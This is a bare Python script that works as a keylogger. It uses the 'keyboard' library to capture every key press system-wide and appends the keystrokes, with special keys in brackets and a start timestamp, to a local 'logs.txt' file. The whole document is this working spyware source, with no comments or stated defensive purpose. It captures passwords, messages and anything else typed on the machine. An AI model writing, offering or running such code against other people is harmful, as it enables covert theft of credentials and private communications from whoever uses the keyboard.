import keyboard
from datetime import datetime

def writer(data):
    with open("logs.txt", "a") as file:
        file.write(data)

def filter(char):
    if char == "space":
        return " "
    elif len(char) > 1:
        return "[%s]" % char
    else:
        return char

def start_logger():
    now = datetime.now()
    start_time = now.strftime("%Y-%m-%d %H:%M:%S")
    writer(f"\nScript started at {start_time} ")

    def logger(event):
        data_to_log = filter(event.name)
        writer(data_to_log)

    keyboard.on_press(logger)
    keyboard.wait()

    writer(" Script stopped.")

if __name__ == "__main__":
    start_logger()
